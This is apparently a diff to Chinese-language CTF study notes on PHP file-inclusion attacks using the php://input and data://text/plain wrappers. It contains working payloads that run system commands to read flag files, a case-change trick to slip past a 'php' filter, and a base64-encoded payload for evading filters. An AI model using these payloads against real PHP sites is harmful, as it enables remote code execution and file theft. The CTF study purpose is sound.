@@ -21,16 +21,23 @@ php://filter/read=convert.base64-encode/index/resource=flag
 
 ^
 ## **php伪协议 文件包含注入php的php代码**
+
+1. php://input 自动包含POST请求体(需要第一allow_url_include开启)
+
 ```
-1. 自动包含POST请求体:(需要第一allow_url_include开启)
 include php://input
 post请求的请求体参数xx=<?php system(); ?>
 请求体直接就一个<?php system(); ?>也可。
 
-2. 直接包含代码内容:(需要两个allow开启)
+如：
+?file=Php://input  这里大写可以绕过过滤php
+再post：<?php system("tac flag.php");?>
+
+```
+
+2. data://text/plain直接包含代码内容:(需要两个allow开启)
+```
 include data://text/plain,<?php phpinfo(); ?>
-
-
 
 file_get_contents('data://text/plain,welcome to the zjctf','r')
 即为welcome to the zjctf
@@ -40,7 +47,10 @@ file_get_contents($_GET['2333']) === 'todat is a happy day'
 
 
 代码执行获取flag
-payload：?c=data://text/plain,<?php system('cat f*');?>
+payload：
+?c=data://text/plain,<?php system('cat f*');?>
+?c=data://text/plain,<?=system("tac%20flag.php");?>
+
 防止过滤一下：?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
 但是结尾有.php的情况：include($c.".php"); 编码后会失效。
 
